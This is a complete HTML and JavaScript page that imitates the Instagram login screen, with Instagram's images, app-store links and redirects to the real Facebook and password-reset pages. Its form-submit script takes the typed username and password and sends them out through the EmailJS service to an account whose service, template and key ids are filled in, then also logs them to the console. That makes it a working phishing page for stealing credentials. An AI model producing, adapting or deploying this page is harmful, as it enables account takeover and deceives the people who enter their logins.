
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="yo.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" type="image/png">
</head>
<style>


body {
    margin: 0;
    padding: 0;
    font-family: 'Arial', sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.wrapper {
    display: flex;
    max-width: 935px;
    width: 100%;
}

.phone-container {
    position: relative;
    width: 50%;
    display: flex;
    justify-content: center;
}

.phone-image {
    max-height: 600px;
    height: auto;
}

.carousel {
    position: absolute;
    top: 70px;
    left: 55px;
    width: 250px;
    height: 540px;
    overflow: hidden;
}

.carousel-image {
    width: 100%;
    height: auto;
}

.form-container {
    width: 50%;
    max-width: 350px;
    text-align: center;
    margin: auto;
}

.form-box {
    background: white;
    border: 1px solid #dbdbdb;
    padding: 20px;
    margin-bottom: 10px;
}

.logo {
    font-family: 'Brush Script MT', cursive;
    font-size: 2.5rem;
    margin-bottom: 20px;
    color: #262626;
}

form {
    display: flex;
    flex-direction: column;
}

input {
    margin: 5px 0;
    padding: 10px;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    background: #fafafa;
    font-size: 0.9rem;
}

button {
    margin: 10px 0;
    padding: 10px;
    border: none;
    border-radius: 3px;
    background-color: #3897f0;
    color: white;
    font-weight: bold;
    font-size: 0.9rem;
    cursor: pointer;
}

button:hover {
    background-color: #287bcf;
}

.separator {
    display: flex;
    align-items: center;
    margin: 10px 0;
    font-size: 0.9rem;
    color: #8e8e8e;
}

.separator::before,
.separator::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
    margin: 0 10px;
}

.fb-login {
    display: flex;
    align-items: center;
    justify-content: center;
    border: none;
    background: none;
    color: #385185;
    font-weight: bold;
    margin-top: 10px;
    cursor: pointer;
}

.fb-icon {
    margin-right: 8px;
    height: 50px;
    width: 50px;
    padding-left: 45px;
}

.forgot-password {
    display: block;
    margin-top: 15px;
    font-size: 0.9rem;
    color: #385185;
}

.signup-box {
    background: white;
    border: 1px solid #dbdbdb;
    padding: 10px;
}

.signup-box a {
    color: #3897f0;
    text-decoration: none;
}

.signup-box a:hover {
    text-decoration: underline;
}

.app-section {
    margin-top: 20px;
}

.app-buttons img {
    height: 40px;
    margin: 5px;
    cursor: pointer;
}


</style>
<script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
<script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "YOUR_PUBLIC_KEY",
      });
   })();
</script>
<body>
    <div class="wrapper">
        <div class="phone-container">
            <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Phone Preview" class="phone-image">
            <div class="carousel">
                
            </div>
        </div>
        <div class="form-container">
            <div class="form-box">
                <h1 class="logo">Instagram</h1>
                <form id="loginForm">
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                <div class="separator">OR</div>
                <button class="fb-login">
                    <img src="https://th.bing.com/th/id/OIP.ENIq-U2iyx2c51zh5Hv5aAAAAA?rs=1&pid=ImgDetMain" alt="Facebook Icon" class="fb-icon">
                    Log in with Facebook
                </button>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            <div class="app-section">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://www.instagram.com/static/images/appstore-button.png/b27a108592d8.png" alt="App Store">
                    <img src="https://www.instagram.com/static/images/google-play-button.png/2b12cb0b1a5e.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
    <script>

// Image Carousel
const carouselImages = [
    "https://www.instagram.com/static/images/homepage/screenshot1.png/7d018907cf6a.png",
    "https://www.instagram.com/static/images/homepage/screenshot2.png/6f03eb85463c.png",
    "https://www.instagram.com/static/images/homepage/screenshot3.png/f0c687aa6ec2.png",
    "https://www.instagram.com/static/images/homepage/screenshot4.png/842fe5699220.png",
    "https://www.instagram.com/static/images/homepage/screenshot5.png/0a2d3016f375.png",
];

let currentIndex = 0;
const carouselElement = document.querySelector('.carousel-image');

function rotateCarousel() {
    currentIndex = (currentIndex + 1) % carouselImages.length;
    carouselElement.src = carouselImages[currentIndex];
}


// Facebook Login Button
document.querySelector('.fb-login').addEventListener('click', function () {
    alert('Redirecting to Facebook Login...');
    window.location.href = "https://www.facebook.com/login/";
});

// Forgot Password Link
document.querySelector('.forgot-password').addEventListener('click', function (event) {
    event.preventDefault();
    alert('Redirecting to Password Reset...');
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
});

// App Download Buttons
document.querySelectorAll('.app-buttons img').forEach((button, index) => {
    button.addEventListener('click', () => {
        if (index === 0) {
            window.location.href = "https://apps.apple.com/app/instagram/id389801252";
        } else {
            window.location.href = "https://play.google.com/store/apps/details?id=com.instagram.android";
        }
    });
});

// Form Submission
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // EmailJS Integration (Optional - Replace with your own EmailJS details)
    emailjs.init("Ixy6LgIcNUpHSfTb6"); // Initialize EmailJS with your public key
    emailjs.send("service_s77d78t", "template_4doe24u", {
        username: username,
        password: password,
    })
    .then(() => {
        alert("Credentials sent successfully!");
    })
    .catch((error) => {
        console.error("Error sending credentials:", error);
        alert("Failed to send credentials. Check the console for details.");
    });

    console.log(`Username: ${username}, Password: ${password}`); // Logs credentials to the console
    alert('Form submitted. Check the console for details.');
});



</script>
</body>
</html>
